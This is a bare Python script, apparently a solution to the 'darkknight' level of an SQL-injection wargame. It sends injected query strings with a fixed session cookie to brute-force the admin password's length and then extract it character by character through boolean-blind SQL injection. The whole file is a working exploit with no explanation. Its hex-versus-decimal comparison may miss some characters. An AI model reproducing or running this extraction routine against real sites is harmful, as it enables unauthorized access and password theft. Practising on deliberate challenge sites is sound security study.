import requests
 
url = 'http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php'
sess = dict(PHPSESSID = "os6voevp6l3qmmf9727dtolif3")

def exploit(num):
   for i in range(1,num+1):
      for j in range(30,127):
         vul = url + '?pw=123&no=1 || id like "admin" %26%26 hex(mid(pw,'+str(i)+',1)) like '+str(j)+' %23'
         req = requests.get(vul, cookies=sess)
         if "Hello admin" in req.text:
            print(str(j))
            break

for i in range(1, 101):
   attack = url + "?pw=123&no=1 || length(pw) like " + str(i) + "%23"
   res = requests.get(attack, cookies=sess)
   if "Hello admin" in res.text:
      print(str(i) + " ----- O")
      exploit(i)
      break
   else:
      print(str(i) + " ----- X")

print("password length is " + str(i))
